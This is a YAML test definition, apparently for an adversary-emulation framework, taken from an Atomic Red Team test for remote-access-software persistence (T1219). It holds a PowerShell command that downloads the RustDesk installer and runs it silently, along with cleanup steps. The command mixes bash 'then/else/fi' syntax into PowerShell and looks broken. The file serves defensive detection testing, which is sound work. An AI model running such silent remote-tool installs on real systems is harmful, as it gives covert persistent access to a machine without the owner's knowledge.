- id: f1641ba9-919a-4323-b74f-33372333bf0e
  name: RustDesk Files Detected Test on Windows
  description: "An adversary may attempt to trick the user into downloading RustDesk\
    \ and use this to maintain access to the machine. \nDownload of RustDesk installer\
    \ will be at the destination location when successfully executed."
  tactic: command-and-control
  technique:
    attack_id: T1219
    name: Remote Access Software
  platforms:
    windows:
      psh:
        command: 'if(Test-Path "PathToAtomicsFolder\..\ExternalPayloads\rustdesk-1.2.3-1-x86_64.exe")
          {; exit 0; } else {; exit 1; }; then : ; else $parentpath = Split-Path "PathToAtomicsFolder\..\ExternalPayloads\rustdesk-1.2.3-1-x86_64.exe";
          New-Item -Type Directory "$parentpath" -ErrorAction Ignore -Force | Out-Null;
          Invoke-WebRequest -Uri https://github.com/rustdesk/rustdesk/releases/download/1.2.3-1/rustdesk-1.2.3-1-x86_64.exe
          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\rustdesk-1.2.3-1-x86_64.exe";
          fi; Start-Process "PathToAtomicsFolder\..\ExternalPayloads\rustdesk-1.2.3-1-x86_64.exe"
          /S;'
        cleanup: Stop-Process -Name "rustdesk" -Force; Remove-Item "#{installer_path}"
          -ErrorAction Ignore; Get-ChildItem "C:\Users\*\AppData\Local" "rustdesk"
          -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {; $Directory
          = $_.ToString(); Remove-Item $Directory -Recurse -Force -ErrorAction SilentlyContinue;
          }; Remove-Item "C:\ProgramData\RustDesk" -Recurse -Force -ErrorAction SilentlyContinue
  plugin: atomic
  singleton: false
  repeatable: true
  delete_payload: false
  privilege: ''
  buckets:
  - command-and-control
  - atomic-red-team
  - t1219
  author: Atomic Red Team
  additional_info:
    input_arguments:
      installer_path:
        description: where the installer will be downloaded to or already is located
        type: path
        default: PathToAtomicsFolder\..\ExternalPayloads\rustdesk-1.2.3-1-x86_64.exe
      download_url:
        description: url to download teamviewer from
        type: url
        default: https://github.com/rustdesk/rustdesk/releases/download/1.2.3-1/rustdesk-1.2.3-1-x86_64.exe
    dependencies:
    - description: 'RustDesk must exist on disk at the specified location (#{installer_path})

        '
      prereq_command: "if(Test-Path \"#{installer_path}\") {\n    exit 0\n} else {\n\
        \    exit 1\n}\n"
      get_prereq_command: '$parentpath = Split-Path "#{installer_path}"

        New-Item -Type Directory "$parentpath" -ErrorAction Ignore -Force | Out-Null

        Invoke-WebRequest -Uri #{download_url} -OutFile "#{installer_path}"

        '
    technique_created: '2018-04-18T17:59:24.739Z'
    atomic_guid: f1641ba9-919a-4323-b74f-33372333bf0e
    import_timestamp: '2026-09-05T06:41:06.054544Z'
